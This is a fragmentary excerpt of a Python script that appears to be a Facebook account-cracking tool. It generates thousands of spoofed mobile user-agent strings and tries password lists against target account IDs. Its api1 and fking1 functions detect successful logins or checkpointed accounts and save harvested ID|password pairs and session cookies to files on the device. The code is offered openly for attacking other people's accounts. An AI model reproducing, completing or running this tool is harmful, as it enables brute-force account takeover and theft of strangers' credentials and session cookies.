...
for jf in range(10000):
	aa='Mozilla/5.0 (Linux; Android 11; LM-K510 Build/RKQ1.210420.001; wv) AppleWebKit/537.36 (KHTML, like GecFA) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like GecFA) Chrome/'
...
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 7.1.1; Pure 3 Build/n6F26Q) AppleWebKit/537.36 (KHTML, like GecFA) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Gnews Android/2022148526'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V) {str(gt)}'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'n', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'n', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like GecFA) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
...
for nt in range(10000):
	...
	xx=f"Mozilla/5.0 (Linux; Android 7.1.1; Pure 3 Build/n6F26Q) AppleWebKit/537.36 (KHTML, like GecFA) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Gnews Android/2022148526"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	jf=f"Mozilla/5.0 (Linux; Android 11; LM-K510 Build/RKQ1.210420.001; wv) AppleWebKit/537.36 (KHTML, like GecFA) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]"
	ruz.append(jf)
...
\033[1;33m    ║{🆁}[{🅷}•{🆁}] Facebook  : {🅼} 𝑺𝑯𝑨𝑯𝑰 𝑱𝑶𝑲𝑬𝑹      ║
...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [FA-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/FA-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [FA-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/FA-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/FA-CP.txt','a').write(ids+'|'+pas+'\n')
...
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [FA]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/FA-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/FA-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
